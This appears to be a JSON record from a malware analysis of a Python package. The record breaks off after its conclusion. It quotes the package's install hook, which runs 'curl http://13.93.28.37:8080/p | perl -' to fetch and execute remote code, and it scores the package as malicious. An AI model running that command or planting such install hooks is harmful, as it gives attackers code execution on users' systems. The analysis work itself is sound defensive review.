{
  "purpose": "The code executes a remote command during package installation, fetching and executing code from an external IP address, indicating malicious remote code execution behavior.",
  "sources": "The subprocess.run call executing 'curl http://13.93.28.37:8080/p | perl -' during the run() method of the custom install class.",
  "sinks": "The execution of remote code fetched via curl piped into perl, which can lead to arbitrary code execution on the host system.",
  "flows": "Input source: external URL fetched by curl; sink: perl executing the fetched code; flow: remote code fetched and executed during package installation.",
  "anomalies": "Use of subprocess.run with shell=True to execute remote code during setup; misleading class name 'TotallyInnocentClass'; package description explicitly warns 'DONT INSTALL THIS'.",
  "analysis": "The code defines a custom install class that overrides run() to execute a shell command fetching remote code and executing it via perl. This pattern is a classic remote code execution vector, highly suspicious and malicious. The code is straightforward, with no obfuscation, and the URL is hardcoded. The use of shell=True and external IP for code execution during setup poses severe security risks. The reports correctly identify this behavior, assign high malware and security risk scores, and have high confidence in their conclusions. The behavior aligns with known supply chain attack techniques, and the scores are consistent with the severity of executing remote code during package installation.",
  "conclusion": "The code contains clear malicious behavior through remote code fetching and execution during package installation. The malware score should be 1, the obfuscated score 0, and the security risk score 1, reflecting the high severity and potential for system compromise. The reports are accurate, and the package should be considered malicious and unsafe to install.",
